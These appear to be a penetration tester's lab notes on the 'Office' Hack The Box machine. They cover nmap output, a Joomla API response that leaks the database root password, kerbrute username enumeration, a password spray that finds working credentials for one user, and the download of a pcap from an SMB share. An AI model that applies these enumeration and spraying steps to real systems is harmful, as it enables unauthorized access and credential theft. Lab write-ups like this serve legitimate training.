



```
kali@kali ~> cat Office.nmap
# Nmap 7.94SVN scan initiated Thu Feb 22 19:37:09 2024 as: nmap -sC -sV -Pn -T4 -oA Office 10.10.11.3
Nmap scan report for 10.10.11.3
Host is up (0.17s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Home
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-23 08:37:42Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
443/tcp  open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m56s
| smb2-time: 
|   date: 2024-02-23T08:38:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 22 19:38:50 2024 -- 1 IP address (1 host up) scanned in 101.07 seconds

```



- DNS 53 open
- 80 HTTP 
- 88 Kerberos
- 139, 445 SMB
- 389,
- 443 SSL


```
kali@kali ~> cat officeFeetpixonlyfansLOL
{
  "links": {
    "self": "http://10.10.11.3/api/index.php/v1/config/application?public=true",
    "next": "http://10.10.11.3/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://10.10.11.3/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_message": "This site is down for maintenance.<br>Please check back again soon.",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "display_offline_message": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_image": "",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "sitename": "Holography Industries",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "editor": "tinymce",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "captcha": "0",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "list_limit": 20,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "access": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang_const": true,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "root",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "H0lOgrams4reTakIng0Ver754!",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla_db",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbprefix": "if2tx_",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbencryption": 0,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbsslverifyservercert": false,
        "id": 224
      }
    }
  ],
  "meta": {
    "total-pages": 4
  }
}

```


```
kali@kali ~/kerbrute (master)> ./kerbrute_linux_386 userenum -d office.htb --dc 10.10.11.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt
```


```
kali@kali ~/kerbrute (master)> ./kerbrute_linux_386 userenum -d office.htb --dc 10.10.11.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/23/24 - Ronnie Flathers @ropnop

2024/02/23 07:00:01 >  Using KDC(s):
2024/02/23 07:00:01 >  	10.10.11.3:88

2024/02/23 07:00:47 >  [+] VALID USERNAME:	 administrator@office.htb
2024/02/23 07:03:48 >  [+] VALID USERNAME:	 Administrator@office.htb
2024/02/23 07:05:17 >  [+] VALID USERNAME:	 ewhite@office.htb
2024/02/23 07:05:17 >  [+] VALID USERNAME:	 etower@office.htb
2024/02/23 07:05:17 >  [+] VALID USERNAME:	 dwolfe@office.htb
2024/02/23 07:05:18 >  [+] VALID USERNAME:	 dlanor@office.htb
2024/02/23 07:05:18 >  [+] VALID USERNAME:	 dmichael@office.htb
2024/02/23 07:30:42 >  [+] VALID USERNAME:	 hhogan@office.htb
2024/02/23 07:37:18 >  [+] VALID USERNAME:	 DWOLFE@office.htb
2024/02/23 08:41:57 >  [+] VALID USERNAME:	 DLANOR@office.htb
2024/02/23 10:15:27 >  [+] VALID USERNAME:	 tstark@office.htb

```



```
kali@kali ~> cat awk.txt 
2024/02/23 07:00:47 >  [+] VALID USERNAME:	 administrator@office.htb
2024/02/23 07:03:48 >  [+] VALID USERNAME:	 Administrator@office.htb
2024/02/23 07:05:17 >  [+] VALID USERNAME:	 ewhite@office.htb
2024/02/23 07:05:17 >  [+] VALID USERNAME:	 etower@office.htb
2024/02/23 07:05:17 >  [+] VALID USERNAME:	 dwolfe@office.htb
2024/02/23 07:05:18 >  [+] VALID USERNAME:	 dlanor@office.htb
2024/02/23 07:05:18 >  [+] VALID USERNAME:	 dmichael@office.htb
kali@kali ~> cat awk.txt | awk '{print $}'
awk: cmd. line:1: {print $}
awk: cmd. line:1:         ^ syntax error
kali@kali ~ [0|1]> cat awk.txt | awk '{print $7}'
administrator@office.htb
Administrator@office.htb
ewhite@office.htb
etower@office.htb
dwolfe@office.htb
dlanor@office.htb
dmichael@office.htb
kali@kali ~> cat awk.txt | awk '{print $7}' | cut -d '@' -f 1
administrator
Administrator
ewhite
etower
dwolfe
dlanor
dmichael
kali@kali ~> cat awk.txt | awk '{print $7awk }' |  awk '{print $1}'
administrator@office.htb
Administrator@office.htb
ewhite@office.htb
etower@office.htb
dwolfe@office.htb
dlanor@office.htb
dmichael@office.htb
kali@kali ~> cat awk.txt | awk '{print $7}' |  awk -F '@' '{print $1}'
administrator
Administrator
ewhite
etower
dwolfe
dlanor
dmichael

```



# Now we have user enum lets try something else





## SMB testing

```
kali@kali ~> nxc smb 10.10.11.3 -u officeusers.txt -p 'H0lOgrams4reTakIng0Ver754!'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754 STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754 STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754 STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754 STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754 STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754 STATUS_LOGON_FAILURE
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754 STATUS_LOGON_FAILURE

```


nothing

## ldap 

```
kali@kali ~> nxc ldap 10.10.11.3 -u officeusers.txt -p 'H0lOgrams4reTakIng0Ver754!' --port 636
LDAP        10.10.11.3      636    10.10.11.3       [-] Error retrieving os arch of 10.10.11.3: Could not connect: timed out
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.3      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! 
LDAP        10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! 
LDAP        10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! 
LDAP        10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! 
LDAP        10.10.11.3      636    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 

```



lets check out smb again


```
kali@kali ~/H/office> cat /tmp/nxc_spider_plus/10.10.11.3.json
{
    "NETLOGON": {},
    "SOC Analysis": {
        "Latest-System-Dump-8fbc124d.pcap": {
            "atime_epoch": "2023-05-07 20:59:54",
            "ctime_epoch": "2023-05-07 20:59:54",
            "mtime_epoch": "2023-05-10 14:51:42",
            "size": "1.31 MB"
        }
    },
    "SYSVOL": {
        "office.htb/Policies/{04FE5C75-0078-4D44-97C5-8A796BE906EC}/GPT.INI": {
            "atime_epoch": "2023-05-10 12:47:27",
            "ctime_epoch": "2023-05-10 12:47:27",
            "mtime_epoch": "2023-05-10 12:47:27",
            "size": "59 B"
        },
        "office.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2023-05-08 21:39:04",
            "ctime_epoch": "2023-04-14 18:13:57",
            "mtime_epoch": "2023-05-10 13:30:07",
            "size": "23 B"
        },
        "office.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2023-05-08 21:39:04",
            "ctime_epoch": "2023-04-14 18:13:57",
            "mtime_epoch": "2023-05-10 13:30:07",
            "size": "1.37 KB"
        },
        "office.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2023-04-14 18:18:40",
            "ctime_epoch": "2023-04-14 18:18:40",
            "mtime_epoch": "2023-05-10 13:30:07",
            "size": "2.72 KB"
        },
        "office.htb/Policies/{37238285-35D0-4D0C-A702-B489C38ED505}/GPT.INI": {
            "atime_epoch": "2023-05-10 12:45:44",
            "ctime_epoch": "2023-05-10 12:45:44",
            "mtime_epoch": "2023-05-10 12:45:44",
            "size": "59 B"
        },
        "office.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2024-01-25 17:40:03",
            "ctime_epoch": "2023-04-14 18:13:57",
            "mtime_epoch": "2024-01-25 17:40:03",
            "size": "23 B"
        },
        "office.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2024-01-25 17:40:03",
            "ctime_epoch": "2023-04-14 18:13:57",
            "mtime_epoch": "2024-01-25 17:40:03",
            "size": "3.86 KB"
        },
        "office.htb/Policies/{7B6165C4-C41D-47ED-9A37-E1A058F230C1}/GPT.INI": {
            "atime_epoch": "2023-05-10 12:47:14",
            "ctime_epoch": "2023-05-10 12:47:14",
            "mtime_epoch": "2023-05-10 12:47:14",
            "size": "59 B"
        },
        "office.htb/Policies/{9D183BB5-7581-4C19-9390-B1EBCCACCE99}/GPT.INI": {
            "atime_epoch": "2023-05-10 12:47:05",
            "ctime_epoch": "2023-05-10 12:47:05",
            "mtime_epoch": "2023-05-10 12:47:05",
            "size": "59 B"
        },
        "office.htb/Policies/{EC1FEBA4-DB03-4721-81DB-B0BAA61FFA18}/GPT.INI": {
            "atime_epoch": "2023-05-10 12:46:49",
            "ctime_epoch": "2023-05-10 12:46:49",
            "mtime_epoch": "2023-05-10 12:46:49",
            "size": "59 B"
        }
    }
}

kali@kali ~/H/office> smbclient '//10.10.11.3/SOC Analysis' -U dwolfe
Password for [WORKGROUP\dwolfe]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed May 10 14:52:24 2023
  ..                                DHS        0  Wed Feb 14 05:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 20:59:00 2023

		6265599 blocks of size 4096. 1145270 blocks available
smb: \> get Latest-System-Dump-8fbc124d.pcap
getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (924.6 KiloBytes/sec) (average 924.6 KiloBytes/sec)
smb: \> exit


```






# Mistakes

Read errors, understand the tools and when doing ANY command do NOT half ass it and quit because of an error without understand if the error is because YOU fucked it up or because its the wrong thread. FOCUS. (use wordlists)


only use `-d` when doing bloodhound with nxc, on normal nxc cases with ldap dont use the domain + learn the FQDN

Full qualified domain name
hostname.domain.top-level-domain
`DC.office.htb`
